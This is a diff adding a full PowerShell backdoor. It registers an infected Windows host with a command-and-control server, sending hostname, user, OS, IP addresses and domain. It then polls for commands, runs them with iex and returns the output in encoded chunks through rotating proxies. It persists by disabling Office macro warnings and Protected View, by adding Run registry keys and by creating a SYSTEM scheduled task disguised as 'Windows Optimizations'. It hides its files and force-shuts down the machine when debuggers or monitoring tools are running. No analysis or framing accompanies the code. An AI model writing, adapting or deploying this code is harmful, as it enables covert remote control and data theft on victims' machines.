@@ -1,0 +1,235 @@
+function httpSend
+{
+    param([string]$url, [string]$site, [string]$urltT)
+	$l = New-Object System.Net.WebClient;
+	$l.proxy = [Net.WebRequest]::GetSystemWebProxy();
+	$l.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;
+	$urlT = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($url))
+	$a = $l.DownloadString("$($site)$($urlT)")
+    return $a
+
+}
+
+function httpGet
+{
+    param([string] $url)
+	foreach ($st in $proxy) {
+
+		$rnd = Get-Random -minimum 0 -maximum (($proxy.Length/2)-1)
+		$site = $proxy[$rnd*2]
+        $f1site = $proxy[(($rnd*2)+1)%$proxy.Length]
+        $f2site = $proxy[(($rnd*2)+3)%$proxy.Length]
+
+		try {
+            $a = httpSend $url $f1site $urlT
+		}
+		catch [Net.WebException] {
+
+			Start-Sleep -s 1
+		}
+
+		try {
+			 $a = httpSend $url $f2site $urlT
+		}
+		catch [Net.WebException] {
+
+			Start-Sleep -s 1
+		}
+
+		try {
+			$a = httpSend $url $site $urlT
+			if($a.Length -le 30000) {
+				return $a
+			}
+		}
+		catch [Net.WebException] {
+
+			Start-Sleep -s 40
+		}
+
+	}
+    try {
+		$l = New-Object System.Net.WebClient;
+		$l.proxy = [Net.WebRequest]::GetSystemWebProxy();
+		$l.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;
+		$a = $l.DownloadString("$($ip)/?p=$($url)")
+        return $a
+    }
+    catch [Net.WebException] {
+        return $false
+    }
+
+}
+
+function apiGet
+{
+    param([string]$q)
+    write-host "?status=update"
+    $res = httpGet("$(encode $q)");
+    return $res
+}
+
+function register
+{
+    $ips=""
+    gwmi Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | where{$_.IPAddress[0] -NotLike '169*'} | % {$ips = $ips +"-"+ $_.IPAddress[0]}
+    $os = (Get-WmiObject Win32_OperatingSystem).Name
+    $os = $os.Split('{|}', [System.StringSplitOptions]::RemoveEmptyEntries)
+    $os ="$((Get-WmiObject Win32_OperatingSystem).OSArchitecture)|$((Get-WmiObject Win32_OperatingSystem).Version)|$($os[0])|$($os[1])"
+
+    $res = apiGet "a=r&b=$($env:computername)~~$($env:username)~~$os~~$($ips.subString(1))~~$((Get-WmiObject Win32_ComputerSystem).Domain)"
+    if($res){$global:id = $res; $true}
+    else {}
+}
+
+
+function getCommand
+{
+    if(($global:cmd = apiGet "a=g&b=$id") -eq "-1" ) {return}
+    if($global:cmd.Length -eq 0) {return $true}
+    $cmd = decode($global:cmd)
+    if($cmd -eq 'register') {return register}
+    if($cmd -eq '-1') {return $false}
+    $parts = $cmd.Split('{~~}',[System.StringSplitOptions]::RemoveEmptyEntries)
+    $cmdId = $parts[0]
+    $cmd = $parts[1]
+    $res = (eval($cmd) | out-string)
+    if($res -eq "") {$res = "Error"}
+    sendResult -cmdId $cmdId -result (encode($res))
+    return $true
+}
+
+function eval
+{
+    param([string] $e)
+    try {
+        iex $e
+
+    } catch {
+    }
+}
+
+
+function sendResult
+{
+    param([string]$cmdId, [string]$result)
+    write-host "Usage : ..."
+    $prefix = "a=s&i=$id&ch=last&ci=$cmdId"
+    $chunks = [math]::floor($result.Length / $cs)
+    if($chunks -eq 0){
+        apiGet "$prefix&r=$result"
+    }else{
+        for($j=0; $j -le $chunks; ++$j){
+            $httpResult=''
+            if($j -eq $chunks){
+                $chunk = $result.Substring($j*$cs)
+                $httpResult = apiGet "$prefix&ch=last&r=$chunk"
+            }else{
+                $chunk = $result.Substring($j*$cs,$cs)
+                $httpResult = apiGet "$prefix&ch=$j&r=$chunk"
+            }
+            if($httpResult -ne 'OK'){break}
+        }
+    }
+}
+
+
+function getKey
+{
+
+    $keyPath = "$($s_path)\$($env:username).dat"
+    if((Test-Path $keyPath) -eq $true){
+        $key = Get-Content $keyPath
+        if($key -match "^[a-f0-9]{32}$"){
+            $global:id = $key
+            return $key
+        }
+    }
+
+
+    if(-not (register)) {return $false}
+
+
+    if($global:id.Length -gt 0){
+		if($global:id -match "^[a-f0-9]{32}$"){
+			Set-Content $keyPath $global:id
+			return $global:id
+		}
+    }
+    return $false
+}
+
+
+function persist
+{
+    for($i=10; $i -le 20; $i++){
+        $rgb = "HKCU:\Software\Microsoft\Office\$i.0\excel\Security";
+        if(test-path $rgb){
+            New-ItemProperty -Path $rgb -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | out-null;
+            New-ItemProperty -Path $rgb -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | out-null;
+            $rgb = "$rgb\ProtectedView";
+            if(test-path $rgb){
+                New-ItemProperty -Path $rgb -Name DisableAttachementsInPV -Value 1 -PropertyType DWORD -Force | out-null;
+                New-ItemProperty -Path $rgb -Name DisableInternetFilclsesInPV -Value 1 -PropertyType DWORD -Force | out-null;
+                New-ItemProperty -Path $rgb -Name DisableUnsafeLocationsInPV -Value 1 -PropertyType DWORD -Force | out-null;
+            }
+        }
+        $rgb = "HKCU:\Software\Microsoft\Office\$i.0\word\Security";
+        if(test-path $rgb){
+            New-ItemProperty -Path $rgb -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | out-null;
+            New-ItemProperty -Path $rgb -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | out-null;
+            $rgb = "$rgb\ProtectedView";
+            if(test-path $rgb){
+                New-ItemProperty -Path $rgb -Name DisableAttachementsInPV -Value 1 -PropertyType DWORD -Force | out-null;
+                New-ItemProperty -Path $rgb -Name DisableInternetFilesInPV -Value 1 -PropertyType DWORD -Force | out-null;
+                New-ItemProperty -Path $rgb -Name DisableUnsafeLocationsInPV -Value 1 -PropertyType DWORD -Force | out-null;
+            }
+        }
+    }
+
+    attrib +s +h "$s_path\system.vbs"
+    attrib +s +h "$s_path\system.ps1"
+    regWrite -p HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run -k "Windows Optimizations" -v "wscript $tsk"
+    regWrite -p HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run -k "Windows Optimizations" -v "wscript $tsk"
+    schtasks /Create /RU system /SC ONLOGON /TN Microsoft\WindowsOptimizationsService /TR "wscript $tsk" /F
+
+}
+
+function isDeugEnv
+{
+    $p = @("ollydbg","ProcessHacker","tcpview","autoruns","autorunsc","filemon","procmon","regmon","procexp","idaq","idaq64","ImmunityDebugger","Wireshark","dumpcap","HookExplorer","ImportREC","PETools","LordPE","dumpcap","SysInspector","proc_analyzer","sysAnalyzer","sniff_hit","windbg","joeboxcontrol","joeboxserver")
+    for ($i=0; $i -lt $p.length; $i++) {
+
+        if(ps -name $p[$i] -ErrorAction SilentlyContinue){
+            shutdown /s /f /t 0
+            exit
+        }
+    }
+}
+
+function doSleep
+{
+    if((@(dir C:\\Users\\Public\\Documents\\*.dat)).Length -ge 1) {return}
+	write-host "...."
+    Start-sleep -Seconds 3600
+
+}
+
+
+isDeugEnv
+persist
+doSleep
+
+regWriteLocalMachineProxy $LocalMachine $k
+regWriteCurrentUserProxy $p $k
+$proxy = $all_url
+while ((getKey) -eq $false){ Start-Sleep 120 }
+
+
+$failCount=0
+while ($true){
+    isDeugEnv
+    if((getCommand) -eq $false){++$failCount}
+    if($failCount -gt 4){getKey}
+    Start-Sleep -s 300
+}
